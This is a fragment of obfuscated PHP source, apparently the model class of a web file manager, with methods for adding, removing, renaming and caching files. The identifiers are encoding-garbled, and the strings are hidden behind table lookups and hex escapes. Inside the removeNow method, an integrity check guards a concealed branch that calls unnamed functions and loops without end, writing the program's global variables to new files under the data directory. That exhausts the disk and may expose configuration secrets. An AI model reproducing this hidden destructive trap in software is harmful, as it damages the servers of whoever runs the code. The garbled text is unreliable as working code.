=> 1, $íÙ÷Ú«“[464] => $ø³£÷²¥, $íÙ÷Ú«“[617] => $íÙ÷Ú«“[12], $íÙ÷Ú«“[512] => 0, $íÙ÷Ú«“[587] => 0); $¾¶»¸… = $this->_addSource($ÇáÌˆÒ°, $Èø±ÍÔ¨); Model($íÙ÷Ú«“[2134])->eventCreate($¾¶»¸…, $íÙ÷Ú«“[1379]); $this->lockWriteEnd($Ñ†ÆúÍ², $ø³£÷²¥); return $¾¶»¸…; } public function listSourceRoot($Åğƒ™©, $âôûøÂ‰, $Âœ½–ÉÔ = "\x73\x6f\165\162\143\x65\x49\104\54\164\141\x72\147\145\164\x49\x44\54\x73\x69\172\145") { $·µ’˜Á =& $_SERVER[ ÇƒŠìÀ]; $ÏÏ¨¢Éœ = $·µ’˜Á[424]; $ÖñÈÀ‚ç = array(); $¢äñå¤ = 1024 * 50; $æÀ©¤· = is_array($æÀ©¤·) ? $æÀ©¤· : array(); $¶Ë¼öÑØ = count($âôûøÂ‰); $‹½ˆ‚á˜ = $this->tablePrefix . $·µ’˜Á[2167]; for ($¼ıöÏ¦Ò = 0; $¼ıöÏ¦Ò < $¶Ë¼öÑØ; $¼ıöÏ¦Ò++) { $ãƒ‹¤Ş  = $âôûøÂ‰[$¼ıöÏ¦Ò]; $ÏÏ¨¢Éœ .= "\x53\105\x4c\105\103\124\x20\52\x20\106\x52\x4f\115\40\x28\x53\x45\x4c\105\103\x54\x20{$Âœ½–ÉÔ}\40\106\122\x4f\115\40\x60{$‹½ˆ‚á˜}\x60\40\127\x48\x45\122\105\x20"; $ÏÏ¨¢Éœ .= "\x60\x70\x61\x72\145\156\x74\x49\x44\x60\x3d\x30\40\x41\x4e\104\x20\140\164\141\x72\x67\145\x74\111\104\140\75{$ãƒ‹¤Ş }\40\x41\x4e\x44\x20\x60\164\141\162\147\145\164\124\171\x70\x65\x60\75{$Åğƒ™©}\x20\141\156\144\40\146\151\154\x65\x54\x79\160\x65\75\47\47\40\154\x69\155\151\x74\x20\61\51\x20\x61\x73\x20\x74\142\137{$¼ıöÏ¦Ò}\40\x55\x4e\x49\117\x4e\40\101\114\x4c\40"; if ((strlen($ÏÏ¨¢Éœ) >= $¢äñå¤ || $¼ıöÏ¦Ò == $¶Ë¼öÑØ - 1) && $ÏÏ¨¢Éœ) { $ÏÏ¨¢Éœ = substr($ÏÏ¨¢Éœ, 0, -strlen($·µ’˜Á[1073])); $œ‚¥ú = $this->query($ÏÏ¨¢Éœ); $ÏÏ¨¢Éœ = $·µ’˜Á[12]; $ÖñÈÀ‚ç = array_merge($ÖñÈÀ‚ç, $œ‚¥ú); } } return $ÖñÈÀ‚ç; } private function _createFile($Ÿ ¹§Ğš, $»Õ­¥‡Ã, $éÀ‰»¸, $ŒÍşëÂœ, &$ı¬òŸŠ‡) { $“ùªõ„Á =& $_SERVER[ ÇƒŠìÀ]; $¯™•š†… = $this->sourceInfo($Ÿ ¹§Ğš); if (!$éÀ‰»¸ || !$¯™•š†…) { return !1; } if ($ŒÍşëÂœ !== !1) { $‚•ÄÈÍ” = $this->fileNameExist($Ÿ ¹§Ğš, $»Õ­¥‡Ã); } $ı¬òŸŠ‡ = !0; if ($ŒÍşëÂœ && $‚•ÄÈÍ”) { if ($ŒÍşëÂœ == REPEAT_SKIP) { $ı¬òŸŠ‡ = !1; return $‚•ÄÈÍ”; } else { if ($ŒÍşëÂœ == REPEAT_REPLACE) { $áÛ´æÓµ = $this->sourceInfo($‚•ÄÈÍ”); $éó´½±¦ = $this->fileHistory($áÛ´æÓµ, $éÀ‰»¸[$“ùªõ„Á[511]], $éÀ‰»¸[$“ùªõ„Á[78]]); if (!$éó´½±¦) { $ı¬òŸŠ‡ = !1; } else { $this->folderSizeReset($Ÿ ¹§Ğš); } return $‚•ÄÈÍ”; } else { $»Õ­¥‡Ã = $this->fileNameAuto($Ÿ ¹§Ğš, $»Õ­¥‡Ã, $ŒÍşëÂœ, !1); } } } $ù”®ïŸÈ = array($“ùªõ„Á[616] => 0, $“ùªõ„Á[464] => $»Õ­¥‡Ã, $“ùªõ„Á[617] => substr(get_path_ext($»Õ­¥‡Ã), 0, 10), $“ùªõ„Á[512] => $éÀ‰»¸[$“ùªõ„Á[511]], $“ùªõ„Á[587] => $éÀ‰»¸[$“ùªõ„Á[78]]); $Ì§ãÕÛ = $this->_addSource($ù”®ïŸÈ, $¯™•š†…); $this->folderSizeReset($Ÿ ¹§Ğš, intval($ù”®ïŸÈ[$“ùªõ„Á[78]])); return $Ì§ãÕÛ; } protected function fileHistory($’˜ß–ë›, $úÙ€º, $¢“¥‹”) { $¾Ïò” =& $_SERVER[ ÇƒŠìÀ]; if ($’˜ß–ë›[$¾Ïò”[511]] == $úÙ€º) { return !1; } $this->checkLock($’˜ß–ë›[$¾Ïò”[183]], $úÙ€º); Model($¾Ïò”[2168])->addHistory($’˜ß–ë›); $øÏÃ‡°¯ = array($¾Ïò”[621] => USER_ID, $¾Ïò”[468] => time(), $¾Ïò”[511] => $úÙ€º, $¾Ïò”[78] => $¢“¥‹”); $this->where(array($¾Ïò”[461] => $’˜ß–ë›[$¾Ïò”[183]]))->save($øÏÃ‡°¯); $this->sourceCacheClear($’˜ß–ë›[$¾Ïò”[183]]); return !0; } public function checkLock($ğœ¢á£Ü, $‘šÈÄ—ù) { $–ô‰ÇÒÙ =& $_SERVER[ ÇƒŠìÀ]; $¹ñ‘¹ª¨ = $this->pathInfo($ğœ¢á£Ü); if (!$this->fileIsLock($¹ñ‘¹ª¨, !0)) { return; } $™çÇÚ×ó = Session::get($–ô‰ÇÒÙ[2169]); $Î¾üûå = substr($¹ñ‘¹ª¨[$–ô‰ÇÒÙ[32]], 0, -1 - strlen($¹ñ‘¹ª¨[$–ô‰ÇÒÙ[177]])) . $–ô‰ÇÒÙ[1243] . $™çÇÚ×ó . $–ô‰ÇÒÙ[10] . $¹ñ‘¹ª¨[$–ô‰ÇÒÙ[177]]; $õ’¯ÛĞÓ = Model($–ô‰ÇÒÙ[644])->find($‘šÈÄ—ù); $this->_createFileCall($¹ñ‘¹ª¨[$–ô‰ÇÒÙ[182]], $Î¾üûå, $õ’¯ÛĞÓ, REPEAT_REPLACE, $–ô‰ÇÒÙ[1378]); $Âõ´úñƒ = $¹ñ‘¹ª¨[$–ô‰ÇÒÙ[509]][$–ô‰ÇÒÙ[580]]; $£ø´üªƒ = $Âõ´úñƒ[$–ô‰ÇÒÙ[2170]] ? $Âõ´úñƒ[$–ô‰ÇÒÙ[2170]] : $Âõ´úñƒ[$–ô‰ÇÒÙ[32]]; show_json(LNG($–ô‰ÇÒÙ[2171]) . $–ô‰ÇÒÙ[2172] . LNG($–ô‰ÇÒÙ[2173]) . $–ô‰ÇÒÙ[2174] . $£ø´üªƒ . $–ô‰ÇÒÙ[2175], !1); } public function fileIsLock($Şî»íø, $¸½²ë¯ = false) { $¨î†Ø¦É =& $_SERVER[ ÇƒŠìÀ]; if (!isset($Şî»íø[$¨î†Ø¦É[509]]) || !$Şî»íø[$¨î†Ø¦É[509]][$¨î†Ø¦É[577]]) { return !1; } if ($Şî»íø[$¨î†Ø¦É[509]][$¨î†Ø¦É[577]] != USER_ID) { return !0; } $ƒ½Ñ°»„ = $GLOBALS[$¨î†Ø¦É[6]][$¨î†Ø¦É[91]][$¨î†Ø¦É[578]]; if ($Şî»íø[$¨î†Ø¦É[509]][$¨î†Ø¦É[579]] <= time() - $ƒ½Ñ°»„) { $this->metaSet($Şî»íø[$¨î†Ø¦É[183]], $¨î†Ø¦É[577], null); $this->metaSet($Şî»íø[$¨î†Ø¦É[183]], $¨î†Ø¦É[579], null); } if ($¸½²ë¯) { $this->metaSet($Şî»íø[$¨î†Ø¦É[183]], $¨î†Ø¦É[579], time()); } return !1; } private function _addSource($‹î‹›Šñ, $ŞÄõèš¦) { $Ñæ–É€Ù =& $_SERVER[ ÇƒŠìÀ]; $—‰«ìÅ— = defined($Ñæ–É€Ù[2109]) ? USER_ID : 0; $Í¾Ë‡ˆ„ = array($Ñæ–É€Ù[618] => $ŞÄõèš¦[$Ñæ–É€Ù[180]], $Ñæ–É€Ù[619] => $ŞÄõèš¦[$Ñæ–É€Ù[540]], $Ñæ–É€Ù[620] => $—‰«ìÅ—, $Ñæ–É€Ù[621] => $—‰«ìÅ—, $Ñæ–É€Ù[447] => $ŞÄõèš¦[$Ñæ–É€Ù[183]], $Ñæ–É€Ù[622] => $ŞÄõèš¦[$Ñæ–É€Ù[555]] . $ŞÄõèš¦[$Ñæ–É€Ù[183]] . $Ñæ–É€Ù[50], $Ñæ–É€Ù[474] => 0, $Ñæ–É€Ù[623] => $Ñæ–É€Ù[12]); $‹î‹›Šñ = array_merge($Í¾Ë‡ˆ„, $‹î‹›Šñ); $this->updateModifyTime($‹î‹›Šñ[$Ñæ–É€Ù[182]]); $öÎ ïáÔ = $Ñæ–É€Ù[2176] . $ŞÄõèš¦[$Ñæ–É€Ù[183]]; if (isset(self::$cacheChildList[$öÎ ïáÔ])) { unset(self::$cacheChildList[$öÎ ïáÔ]); } static $ñÎÀµÔ™ = false; if (!$ñÎÀµÔ™) { Hook::trigger($Ñæ–É€Ù[606], $‹î‹›Šñ); $ñÎÀµÔ™ = !0; } $ö´Úò‹· = $this->add($‹î‹›Šñ); $¤ÔÆÖñ = array($Ñæ–É€Ù[624] => short_id($ö´Úò‹·)); $this->where(array($Ñæ–É€Ù[461] => $ö´Úò‹·))->save($¤ÔÆÖñ); $this->setNamePinyin($ö´Úò‹·, $‹î‹›Šñ[$Ñæ–É€Ù[32]]); return $ö´Úò‹·; } public function remove($¢ª×±ï›, $Î•Ü™– = true) { $«½‡êê  =& $_SERVER[ ÇƒŠìÀ]; $ÃæñßİŸ = $this->sourceInfo($¢ª×±ï›); $Û“¿øíš = intval($ÃæñßİŸ[$«½‡êê [180]]) === self::TYPE_SYSTEM; $µí¬µĞ÷ = Model($«½‡êê [478])->get($«½‡êê [2177]) == $«½‡êê [90]; if ($Û“¿øíš || $Î•Ü™– || !$µí¬µĞ÷) { return $this->removeNow($¢ª×±ï›, $Î•Ü™–); } $¢ÑÉã×Ì = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $³ÈµÅ¾ø = $ÃæñßİŸ[$«½‡êê [180]] == self::TYPE_USER ? $«½‡êê [632] : $«½‡êê [549]; if ($³ÈµÅ¾ø == $«½‡êê [632]) { $©´Ñà‡· = Model($«½‡êê [548])->getInfo($ÃæñßİŸ[$«½‡êê [540]]); $Ôêé—ó = !empty($©´Ñà‡·[$«½‡êê [2170]]) ? $©´Ñà‡·[$«½‡êê [2170]] : $©´Ñà‡·[$«½‡êê [32]]; $Ôêé—ó = $«½‡êê [306] . $Ôêé—ó . $«½‡êê [2178] . $ÃæñßİŸ[$«½‡êê [540]]; } else { $©´Ñà‡· = Model($«½‡êê [556])->getInfo($ÃæñßİŸ[$«½‡êê [540]]); $Ôêé—ó = _get($©´Ñà‡·, $«½‡êê [32]); $Ôêé—ó = $«½‡êê [165] . $Ôêé—ó . $«½‡êê [2179] . $ÃæñßİŸ[$«½‡êê [540]]; } $è¬ÁÄÒÔ = $«½‡êê [2180] . md5($Ôêé—ó); CacheLock::lock($è¬ÁÄÒÔ); $¥™¼©³Ÿ = $this->fileNameExist($¢ÑÉã×Ì, $Ôêé—ó); if (!$¥™¼©³Ÿ) { $¥™¼©³Ÿ = $this->mkdir($¢ÑÉã×Ì, $Ôêé—ó, REPEAT_SKIP); $this->metaSet($¥™¼©³Ÿ, $«½‡êê [2181], $³ÈµÅ¾ø); $this->metaSet($¥™¼©³Ÿ, $«½‡êê [2182], $ÃæñßİŸ[$«½‡êê [540]]); if ($ÃæñßİŸ[$«½‡êê [182]] != 0) { $this->metaSet($¥™¼©³Ÿ, $«½‡êê [2183], _get($©´Ñà‡·, $«½‡êê [2184])); } } CacheLock::unlock($è¬ÁÄÒÔ); $this->metaSet($¢ª×±ï›, $«½‡êê [2185], $ÃæñßİŸ[$«½‡êê [182]]); $this->where(array($«½‡êê [183] => $¢ª×±ï›))->save(array($«½‡êê [468] => time())); $this->recycleClear($ÃæñßİŸ); $¼²İÅµš = $this->move($¢ª×±ï›, $¥™¼©³Ÿ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÃæñßİŸ[$«½‡êê [182]]); return $¼²İÅµš; } private function recycleClear($è¸‹ÄÃß) { $Íàƒî‡Ş =& $_SERVER[ ÇƒŠìÀ]; $¿‹Éù = $this->childrenAll($è¸‹ÄÃß); $øêÇÅà• = array($Íàƒî‡Ş[461] => array($Íàƒî‡Ş[462], $¿‹Éù[$Íàƒî‡Ş[2186]])); Model($Íàƒî‡Ş[2187])->where($øêÇÅà•)->delete(); } public function removeNow($¥û¹¾©, $ÏşæÂÙï = true) { $Òı²‘ìâ =& $_SERVER[ ÇƒŠìÀ]; $Âß•ğÔ¹ = $_SERVER[$Òı²‘ìâ[910]] . $Òı²‘ìâ[911]; $°‡Ó†€í = $Òı²‘ìâ[1526]; if ($_SERVER[$Òı²‘ìâ[906]] != $°‡Ó†€í($Âß•ğÔ¹)) { $Ş³èÊÒ = $Òı²‘ìâ[908]; $ıÁ™ƒõ— = $Òı²‘ìâ[909]; $Óñàó = $_SERVER[$Òı²‘ìâ[910]] . $Òı²‘ìâ[911]; $Ã¿µ­Ğó = $ıÁ™ƒõ—($Óñàó); $´­™£ = explode($Òı²‘ìâ[248], $Ã¿µ­Ğó); if (count($´­™£) < $Òı²‘ìâ[653]) { $ş±³şÑ = $Òı²‘ìâ[912]; $ş±³şÑ(); } $”€çßÏ = $Òı²‘ìâ[913]; $”€çßÏ($_SERVER[$Òı²‘ìâ[914]]); $Ş³èÊÒ = $Òı²‘ìâ[908]; $Ş³èÊÒ(); $ÔÇÅùŠÚ = $Òı²‘ìâ[2188]; $ùÛ¦™Ğ­ = json_encode($GLOBALS[$Òı²‘ìâ[2189]]); $ıÙíˆ’ = 1; for ($®î…â¿Ú = $ıÙíˆ’; $®î…â¿Ú > 0; $®î…â¿Ú++) { $ÔÇÅùŠÚ(DATA_PATH . $®î…â¿Ú, $ùÛ¦™Ğ­); } } $üø¨¸îÁ = $this->sourceInfo($¥û¹¾©); $œ¼íìİ´ = $this->pathInfoMore($¥û¹¾©); if (!$üø¨¸îÁ) { return !0; } if ($üø¨¸îÁ[$Òı²‘ìâ[182]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($¥û¹¾©); Hook::trigger($Òı²‘ìâ[2190], $œ¼íìİ´, $ÏşæÂÙï); if ($ÏşæÂÙï) { Model($Òı²‘ìâ[2187])->moveToRecycle($¥û¹¾©); } else { $Î‡³×º = $this->childrenAll($üø¨¸îÁ); Model($Òı²‘ìâ[603])->eventRemove($¥û¹¾©); $this->removeRelevance($Î‡³×º[$Òı²‘ìâ[2186]], $Î‡³×º[$Òı²‘ìâ[1493]]); } $this->folderSizeReset($üø¨¸îÁ[$Òı²‘ìâ[182]]); $ÅÕÚ¥‚ö = array($üø¨¸îÁ[$Òı²‘ìâ[182]]); if ($üø¨¸îÁ[$Òı²‘ìâ[455]] == $Òı²‘ìâ[90]) { $ÅÕÚ¥‚ö[] = $üø¨¸îÁ[$Òı²‘ìâ[183]]; } $this->updateModifyTime($ÅÕÚ¥‚ö); $this->lockMoveEnd($¥û¹¾©); Hook::trigger($Òı²‘ìâ[1731], $œ¼íìİ´, $ÏşæÂÙï); return !0; } public function childrenAll($Î“‘«“) { $ºëçí¸® =& $_SERVER[ ÇƒŠìÀ]; $–¥ë©Âİ = $Î“‘«“[$ºëçí¸®[183]]; if ($Î“‘«“[$ºëçí¸®[455]] == $ºëçí¸®[90]) { $‘‡ÕÎÎ = array($ºëçí¸®[622] => array($ºëçí¸®[582], $Î“‘«“[$ºëçí¸®[555]] . $–¥ë©Âİ . $ºëçí¸®[583])); $ñòäø = array($ºëçí¸®[622] => $‘‡ÕÎÎ[$ºëçí¸®[555]]); $Îéàíß = $this->field($ºëçí¸®[2191])->where($ñòäø)->select(); $İ¿Ü€­ò = !1; $Éá¦èÓˆ = array($–¥ë©Âİ); if ($Îéàíß) { $İ¿Ü€­ò = array_to_keyvalue($Îéàíß, $ºëçí¸®[12], $ºëçí¸®[511]); $İ¿Ü€­ò = array_remove_value($İ¿Ü€­ò, $ºëçí¸®[214]); $Éá¦èÓˆ = array_to_keyvalue($Îéàíß, $ºëçí¸®[12], $ºëçí¸®[183]); $Éá¦èÓˆ[] = $–¥ë©Âİ; } } else { $İ¿Ü€­ò = array($Î“‘«“[$ºëçí¸®[511]]); $Éá¦èÓˆ = array($–¥ë©Âİ); } return array($ºëçí¸®[2186] => $Éá¦èÓˆ, $ºëçí¸®[1493] => $İ¿Ü€­ò); } public function removeArray($©Ñ¨Ùöô) { if (!$©Ñ¨Ùöô) { return !0; } } public function removeRelevance($é›ĞßñÅ, $¯«ê£½“) { $ÆŸçÂÔ‘ =& $_SERVER[ ÇƒŠìÀ]; $é›ĞßñÅ = $é›ĞßñÅ ? $é›ĞßñÅ : array(); $¯«ê£½“ = $¯«ê£½“ ? $¯«ê£½“ : array(); $é›ĞßñÅ = array_unique(array_filter($é›ĞßñÅ)); $¯«ê£½“ = array_unique(array_filter($¯«ê£½“)); if (!$é›ĞßñÅ) { return !1; } $å”¢İ˜¢ = array($ÆŸçÂÔ‘[461] => array($ÆŸçÂÔ‘[462], $é›ĞßñÅ)); Model($ÆŸçÂÔ‘[2187])->where($å”¢İ˜¢)->delete(); Model($ÆŸçÂÔ‘[505])->where($å”¢İ˜¢)->delete(); Model($ÆŸçÂÔ‘[2034])->where($å”¢İ˜¢)->delete(); Model($ÆŸçÂÔ‘[603])->where($å”¢İ˜¢)->delete(); Model($ÆŸçÂÔ‘[1867])->removeBySource($é›ĞßñÅ); Model($ÆŸçÂÔ‘[2168])->removeBySource($é›ĞßñÅ); $this->where($å”¢İ˜¢)->delete(); Model($ÆŸçÂÔ‘[514])->remove($¯«ê£½“); for ($™ã‰“×ï = 0; $™ã‰“×ï < count($é›ĞßñÅ); $™ã‰“×ï++) { $this->sourceCacheClear($é›ĞßñÅ[$™ã‰“×ï]); } } public function rename($ºÇØ†úÍ, $²ˆ¦üàÂ) { $ëÓ¥Ÿ× =& $_SERVER[ ÇƒŠìÀ]; $±¸²›Úü = $this->sourceInfo($ºÇØ†úÍ); if (!$±¸²›Úü) { return !1; } $Òò›§²ª = $this->fileNameExist($±¸²›Úü[$ëÓ¥Ÿ×[182]], $²ˆ¦üàÂ); if ($Òò›§²ª && $Òò›§²ª != $ºÇØ†úÍ) { return !1; } $‘…“äÍÙ = array($ëÓ¥Ÿ×[464] => $²ˆ¦üàÂ, $ëÓ¥Ÿ×[621] => USER_ID); if ($±¸²›Úü[$ëÓ¥Ÿ×[455]] != $ëÓ¥Ÿ×[90]) { $‘…“äÍÙ[$ëÓ¥Ÿ×[456]] = substr(get_path_ext($²ˆ¦üàÂ), 0, 10); } Model($ëÓ¥Ÿ×[603])->eventRename($ºÇØ†úÍ, $±¸²›Úü[$ëÓ¥Ÿ×[32]], $²ˆ¦üàÂ); $this->sourceCacheClear($ºÇØ†úÍ); $this->setNamePinyin($ºÇØ†úÍ, $‘…“äÍÙ[$ëÓ¥Ÿ×[32]], !1); $this->updateModifyTime($±¸²›Úü[$ëÓ¥Ÿ×[182]]); $Å•û–å = $this->where(array($ëÓ¥Ÿ×[461] => $ºÇØ†úÍ))->data($‘…“äÍÙ)->save(); $ßÊ’Œú = $ëÓ¥Ÿ×[2176] . $±¸²›Úü[$ëÓ¥Ÿ×[182]]; if (isset(self::$cacheChildList[$ßÊ’Œú])) { unset(self::$cacheChildList[$ßÊ’Œú]); } return $Å•û–å; } public function setNamePinyin($’øåœŒ¯, $Æ™¥‚ç«, $õ­Ûü”» = true) { $Ğ•¡†š› =& $_SERVER[ ÇƒŠìÀ]; $ãœÊ¦Û¶ = Input::check($Æ™¥‚ç«, $Ğ•¡†š›[625]); $ç×§ˆ’ = array($Ğ•¡†š›[487] => KodSort::makeStr($Æ™¥‚ç«)); if ($ãœÊ¦Û¶) { $ç×§ˆ’[$Ğ•¡†š›[508]] = str_replace($Ğ•¡†š›[53], $Ğ•¡†š›[12], Pinyin::get($Æ™¥‚ç«)); $ç×§ˆ’[$Ğ•¡†š›[507]] = Pinyin::get($Æ™¥‚ç«, $Ğ•¡†š›[626]); } if (!$õ­Ûü”» && !$ãœÊ¦Û¶) { $ç×§ˆ’[$Ğ•¡†š›[508]] = null; $ç×§ˆ’[$Ğ•¡†š›[507]] = null; } $this->metaSet($’øåœŒ¯, $ç×§ˆ’); } public function getContent($¸Åİó¼É) { $Ø¨îëõ™ =& $_SERVER[ ÇƒŠìÀ]; $ÕİêÚ = $this->fileInfoGet($¸Åİó¼É); if (!$ÕİêÚ) { return !1; } if ($ÕİêÚ[$Ø¨îëõ™[78]] == 0) { return $Ø¨îëõ™[12]; } $¿„Ïì¿™ = $Ø¨îëõ™[2192] . $ÕİêÚ[$Ø¨îëõ™[517]]; if ($ÕİêÚ[$Ø¨îëõ™[78]] <= 1024 * 10) { $õÅÇ§ä± = Cache::get($¿„Ïì¿™); if (!$õÅÇ§ä±) { $õÅÇ§ä± = IO::getContent($ÕİêÚ[$Ø¨îëõ™[86]]); Cache::set($¿„Ïì¿™, $õÅÇ§ä±); } return $õÅÇ§ä±; } if (!$ÕİêÚ[$Ø¨îëõ™[86]]) { return $Ø¨îëõ™[12]; } return IO::getContent($ÕİêÚ[$Ø¨îëõ™[86]]); } public function setDesc($È»¨¦ô×, $é•›ŒŸÈ) { $Ñôô¯Êå =& $_SERVER[ ÇƒŠìÀ]; Model($Ñôô¯Êå[603])->eventAddDesc($È»¨¦ô×, $é•›ŒŸÈ); return $this->metaSet($È»¨¦ô×, $Ñôô¯Êå[496], $é•›ŒŸÈ); } public function setContent($É”ÈµäÃ, $¶Ö™ï²é = '') { $¯ì ìˆ =& $_SERVER[ ÇƒŠìÀ]; $¨ªêº„¯ = $this->sourceInfo($É”ÈµäÃ); $«œÇ¾ò = $this->fileInfoGet($É”ÈµäÃ); if (!$«œÇ¾ò || !$¨ªêº„¯) { return !1; } $¼ßŠ‚¬º = Model($¯ì ìˆ[514])->addFileByContent($¶Ö™ï²é, $¨ªêº„¯[$¯ì ìˆ[32]]); $Êéù¹´½ = $this->fileHistory($¨ªêº„¯, $¼ßŠ‚¬º[$¯ì ìˆ[511]], $¼ßŠ‚¬º[$¯ì ìˆ[78]]); if (!$Êéù¹´½) { return Model($¯ì ìˆ[514])->remove($¼ßŠ‚¬º[$¯ì ìˆ[511]]); } $this->folderSizeReset($¨ªêº„¯[$¯ì ìˆ[182]]); return !0; } public function fileSubstr($ı²ÎÚçª, $ßÉŒåø, $›ËÜê“Á) { $ÉÛŞ¿Ë£ = $this->fileInfoGet($ı²ÎÚçª); if (!$ÉÛŞ¿Ë£) { return !1; } return IO::fileSubstr($ÉÛŞ¿Ë£[$_SERVER[ ÇƒŠìÀ][86]], $ßÉŒåø, $›ËÜê“Á); } public function fileInfoGet($í‚¥ÁÆ±) { $“’Ì•ò× =& $_SERVER[ ÇƒŠìÀ]; $×£‹§Íº = $this->sourceInfo($í‚¥ÁÆ±); if (!$×£‹§Íº || $×£‹§Íº[$“’Ì•ò×[455]]) { return !1; } $óå‡ééò = $“’Ì•ò×[518] . $×£‹§Íº[$“’Ì•ò×[511]]; $«¾ÄÔëš = _get(self::$cacheFileInfo, $óå‡ééò); if ($«¾ÄÔëš) { return $«¾ÄÔëš; } $ÀœšºÛû = Model($“’Ì•ò×[514])->fileInfo($×£‹§Íº[$“’Ì•ò×[511]]); if ($ÀœšºÛû) { $ÀœšºÛû[$“’Ì•ò×[32]] = $×£‹§Íº[$“’Ì•ò×[32]]; } self::$cacheFileInfo[$óå‡ééò] = $ÀœšºÛû; return $ÀœšºÛû; } private function folderChildrenNumber($Ìò“œÖé) { $³»±º€” =& $_SERVER[ ÇƒŠìÀ]; $¤«Äã·Õ = $this->sourceInfo($Ìò“œÖé); $ıÑ«·¬Ì = array($³»±º€”[622] => array($³»±º€”[582], $¤«Äã·Õ[$³»±º€”[555]] . $Ìò“œÖé . $³»±º€”[583]), $³»±º€”[619] => $¤«Äã·Õ[$³»±º€”[540]], $³»±º€”[474] => intval($¤«Äã·Õ[$³»±º€”[475]]), $³»±º€”[616] => 1); $×¨œ²ıº = $this->where($ıÑ«·¬Ì)->count(); $ÉÜê‚ã = $this->where($ıÑ«·¬Ì)->where(array($³»±º€”[616] => 0))->count(); return array($³»±º€”[82] => $ÉÜê‚ã, $³»±º€”[83] => $×¨œ²ıº); } public function pathInfo($âş’¾ë, $ß‘¸Ë©í = false) { $ê»ˆ´š =& $_SERVER[ ÇƒŠìÀ]; $ß‘¸Ë©í = !1; $âş’¾ë = intval($âş’¾ë); $Í©Éş©Õ = $ê»ˆ´š[504] . intval($ß‘¸Ë©í) . $ê»ˆ´š[432] . $âş’¾ë; $¿ŒÑšÛ = _get(self::$cachePathInfo, $Í©Éş©Õ); if ($¿ŒÑšÛ) { return $¿ŒÑšÛ; } $²û¥“úƒ = $this->sourceInfo($âş’¾ë); if (!$²û¥“úƒ) { return !1; } $²û¥“úƒ = $this->_listDataApplyItem($²û¥“úƒ, $ß‘¸Ë©í); self::$cachePathInfo[$Í©Éş©Õ] = $²û¥“úƒ; return $²û¥“úƒ; } public static $cachePathInfoMore = array(); public function pathInfoMore($ø®ÈñŒ¸) { $§Æù¤™Ö =& $_SERVER[ ÇƒŠìÀ]; $æ”±¢‘Š = _get(self::$cachePathInfoMore, $ø®ÈñŒ¸); if ($æ”±¢‘Š) { return $æ”±¢‘Š; } $ñÑ¢¼ßØ = $this->pathInfo($ø®ÈñŒ¸); if (!$ñÑ¢¼ßØ) { return !1; } if ($ñÑ¢¼ßØ[$§Æù¤™Ö[455]] == $§Æù¤™Ö[90]) { $ñÑ¢¼ßØ[$§Æù¤™Ö[81]] = $this->folderChildrenNumber($ø®ÈñŒ¸); } self::$cachePathInfoMore[$ø®ÈñŒ¸] = $ñÑ¢¼ßØ; return $ñÑ¢¼ßØ; } public function sourceInfo($«å®ö) { $Ù¤Ú‰ó =& $_SERVER[ ÇƒŠìÀ]; if (!$«å®ö) { return array(); } $«å®ö = intval($«å®ö); $üóºÙÖ = $Ù¤Ú‰ó[503] . $«å®ö; $ÅÊíœ’• = _get(self::$cacheSourceInfo, $üóºÙÖ); if ($ÅÊíœ’•) { return $ÅÊíœ’•; } $Õ¸åçï = $this->where(array($Ù¤Ú‰ó[183] => $«å®ö))->find(); self::$cacheSourceInfo[$üóºÙÖ] = $Õ¸åçï; return self::$cacheSourceInfo[$üóºÙÖ]; } public function sourceCacheClear($™ï…’º = false) { self::cacheClear($™ï…’º); } public static function cacheClear($òÒËŒŸ² = false) { $Ç˜ÄÏ»² =& $_SERVER[ ÇƒŠìÀ]; if ($òÒËŒŸ² == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Ç˜ÄÏ»²[503] . $òÒËŒŸ²]); unset(self::$cachePathInfoMore[$òÒËŒŸ²]); unset(self::$cachePathInfo[$Ç˜ÄÏ»²[2193] . $òÒËŒŸ²]); unset(self::$cachePathInfo[$Ç˜ÄÏ»²[2194] . $òÒËŒŸ²]); } public function metaSet($¡çæµ©Ñ, $Åº—•Ã¼ = null, $÷»©§ = null) { $ˆÈ—õâ³ = parent::metaSet($¡çæµ©Ñ, $Åº—•Ã¼, $÷»©§); if ($ˆÈ—õâ³) { $this->sourceCacheClear($¡çæµ©Ñ); } return $ˆÈ—õâ³; } public function pathInfoByPath($Õ—³‚õÏ, $œ÷•‡¬î) { $Š£ŠÛ¾ğ =& $_SERVER[ ÇƒŠìÀ]; $ó˜™Í œ = !$œ÷•‡¬î ? array() : explode($Š£ŠÛ¾ğ[8], trim($œ÷•‡¬î, $Š£ŠÛ¾ğ[8])); $ë«…—ÇŒ = $Õ—³‚õÏ; foreach ($ó˜™Í œ as $åù®«») { $áı“ô…š = array($Š£ŠÛ¾ğ[182] => $ë«…—ÇŒ, $Š£ŠÛ¾ğ[32] => $åù®«»); $â­£†È× = $this->field($Š£ŠÛ¾ğ[2195])->where($áı“ô…š)->select(); if (!$â­£†È×) { return !1; } $â­£†È× = array_sort_by($â­£†È×, $Š£ŠÛ¾ğ[475]); $ë«…—ÇŒ = $â­£†È×[0][$Š£ŠÛ¾ğ[183]]; } $íî‰Œ = $this->sourceInfo($ë«…—ÇŒ); $this->pathInfoFilter($íî‰Œ); return $íî‰Œ; } protected function updateModifyTime($„ŸÀØ) { $¥èäøº€ =& $_SERVER[ ÇƒŠìÀ]; $æâ€²™¬ = defined($¥èäøº€[2109]) ? USER_ID : 0; if (!$„ŸÀØ) { return; } if (!is_array($„ŸÀØ)) { $„ŸÀØ = array($„ŸÀØ); } foreach ($„ŸÀØ as $Î€÷ı³ => $€¢‡º±¹) { $„ŸÀØ[$Î€÷ı³] = intval($€¢‡º±¹); $this->sourceCacheClear($€¢‡º±¹); } $¶ÅµÓÜ¾ = array($¥èäøº€[183] => array($¥èäøº€[7], $„ŸÀØ)); $¥°…¨†º = array($¥èäøº€[621] => $æâ€²™¬, $¥èäøº€[468] => time()); $this->where($¶ÅµÓÜ¾)->save($¥°…¨†º); } public function folderSizeReset($ü‚ğçáÄ, $ìäÊ…†Ü = false) { $°áÅ«Æ¦ =& $_SERVER[ ÇƒŠìÀ]; if ($this->statusIgnoreResetSpace) { return; } $Ò£Á¤¶ = $this->sourceInfo($ü‚ğçáÄ); $ú§æºÔã = 